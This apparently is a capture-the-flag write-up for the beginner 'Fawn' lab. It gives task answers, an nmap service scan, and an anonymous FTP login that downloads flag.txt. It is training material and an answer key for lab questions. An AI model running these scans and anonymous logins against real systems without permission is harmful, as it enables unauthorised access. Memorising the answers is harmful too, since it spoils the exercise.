# Fawn
## task 1
File Transfer Protocol
## task 2
21
## task 3
SFTP
## task 4
ping
## task 5
```
┌──(root㉿cbfc9d3c3a36)-[/]
└─# nmap -sV <your target ip>
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 02:38 UTC
Nmap scan report for <your target ip>
Host is up (0.39s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds
```
vsftpd 3.0.3
## task 6
Unix
## task 7
```
ftp -h
```
**-h option is not recognized in my kali-linux...**
## task 8
Anonymous
## task 9
```
┌──(root㉿cbfc9d3c3a36)-[/mnt/src/starting_point/tier0/Fawn]
└─# ftp <your target ip>
Connected to <your target ip>.
220 (vsFTPd 3.0.3)
Name (10.129.43.190:root): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42272|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||51565|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |*************************************************|    32       13.66 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (0.05 KiB/s)
```